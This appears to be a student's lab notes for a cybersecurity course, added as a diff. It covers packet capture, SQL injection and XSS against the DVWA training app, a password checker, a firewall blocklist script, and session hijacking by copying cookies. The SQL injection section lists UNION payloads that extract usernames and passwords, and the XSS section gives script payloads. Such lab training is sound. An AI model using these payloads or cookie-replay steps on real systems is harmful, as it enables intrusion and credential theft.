@@ -1,0 +1,165 @@
+//packet sniffing and network traffic analysis 
+open kali terminal
+python3 -m http.server 8080 
+in new terminal
+sudo tcpdump -i any -w capture.pcap port 8080
+open firefox type http://localhost:8080
+then stop tcpdump terminal and you can see the packets in python terminal 
+on kali icon type file manager-> click on capture.pcap->in search bar type http.method=="POST"
+=====================================================================================================================================================================================================================
+//SQL injection attack
+open kali linux terminal
+sudo apt update
+sudo apt install dvwa -y
+sudo service apache2 start
+sudo service mysql start
+to open dvwa use docker 
+open docker 
+docker pull vulnerables/web-dvwa
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+open browser and type http://127.0.0.1
+or docker run -d -p 8081:80 vulnerables/web-dvwa and open http://127.0.0.1:81
+login username:admin,Password:password 
+click create or reset database if needed again login 
+in that go to dvwa security->set to low->submit
+in that go to sql and type commands 
+normal input-> 1
+Authentication bypass->1' OR '1'='1
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+UNION-BASED INJECTION
+1' UNION SELECT 1,2-- -
+UNION-SELECT EXTRACT DATABASE
+1' UNION SELECT database(),2-- -
+EXTRACT USING TABLE NAME
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
+EXTRACT USING COLUMNS
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
+EXTRACT USERNAME,PASSWORD
+1' UNION SELECT user,password FROM users-- -
+========================================================================================================================================================================================
+//XSS vulnerabilities
+open kali linux terminal
+sudo apt update
+sudo apt install dvwa -y
+sudo service apache2 start
+sudo service mysql start
+to open dvwa use docker 
+open docker 
+docker pull vulnerables/web-dvwa
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+open browser and type http://127.0.0.1
+login username:admin,Password:password 
+reflected XSS
+<script>alert('XSS')</script>
+stored XSS
+name:<h1>hacked
+message:<script>alert('Stored XSS')</script>
+DOM based XSS
+in the url bar add #<script>alert('DOM XSS')</script>
+=================================================================================================================================================================================
+//eml analyser and virus total
+login into your email and download any message
+open eml anayzer in chrome
+keep the downloaded one
+then copy the ip given 
+open virustotal
+in url paste and click search
+==========================================================================================================================================================================
+//password strength testing using python
+import re
+
+while True:
+    p = input("Enter password (or exit): ")
+
+    if p.lower() == "exit":
+        break
+
+    if len(p) < 8:
+        print("Weak")
+    elif not re.search(r'[A-Z]', p):
+        print("Add uppercase letter")
+    elif not re.search(r'[a-z]', p):
+        print("Add lowercase letter")
+    elif not re.search(r'[0-9]', p):
+        print("Add number")
+    elif not re.search(r'[!@#$%^&*]', p):
+        print("Add special character")
+    else:
+        print("Strong Password")
+==================================================================================================================================================================================
+//basic firewall using advanced security
+Open Windows Defender Firewall with Advanced Security. 
+Click on Inbound Rules. 
+Click New Rule,on the right panel.
+Select Custom and click Next.
+Choose All Programs → Click Next. 
+Protocol and Ports: Keep default → Click Next. 
+Under Remote IP address, select These IP addresses. 
+o Click Add and enter the IP you want to block (example: 1.2.3.4). o Click OK → Next.
+Action: Select Block the connection → Next. 
+Profile: Select Domain, Private, Public → Next.
+Name the rule (example: Manual_Block_IP) → Finish. 
+
+using code you will get in outbound rules
+import requests
+import csv
+import subprocess
+
+# Download IP blocklist from Abuse.ch
+url = "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+response = requests.get(url).text
+
+# Delete old firewall rule
+delete_rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+subprocess.run(["powershell", "-Command", delete_rule])
+
+# Read CSV data
+mycsv = csv.reader(
+    filter(lambda x: not x.startswith("#"), response.splitlines())
+)
+
+# Add firewall rules
+for row in mycsv:
+    ip = row[1]
+
+    if ip != "dst_ip":
+        print("Blocking IP:", ip)
+
+        add_rule = (
+            f'netsh advfirewall firewall add rule '
+            f'name="BadIP" dir=out action=block remoteip={ip}'
+        )
+
+        subprocess.run(["powershell", "-Command", add_rule])
+run python filename.py
+==========================================================================================================================================================================================================
+//testing authentication using bruteforce
+//SQL injection attack
+open kali linux terminal
+sudo apt update
+sudo apt install dvwa -y
+sudo service apache2 start
+sudo service mysql start
+to open dvwa use docker 
+open docker 
+docker pull vulnerables/web-dvwa
+docker run --rm -it -p 80:80 vulnerables/web-dvwa
+open browser and type http://127.0.0.1
+login username:admin,Password:password 
+click create or reset database if needed again login 
+in that go to dvwa security->set to low->submit
+in that go to bruteforce attack
+give same username but different passwords it will not login 
+at 3rd or 4th attempt login using admin and password it will get login
+
+then in that right click->inspect->application->cookies->click on http://127.0.0.1 and copy the phsessionid 
+in private window or another window open http://127.0.0.1-->dont login
+then in that right click->inspect->application->cookies->click on http://127.0.0.1->paste the copied value and in the url bar instead of login.php type index.php it should login this is session hijacking
+
+//session fixation
+//session fixation
+open http://127.0.0.1->dont login->in that right click->inspect->application->cookies->click on http://127.0.0.1 and see the phsessionid
+after login->in that right click->inspect->application->cookies->click on http://127.0.0.1 and see the phsessionid 
+then both will be same 
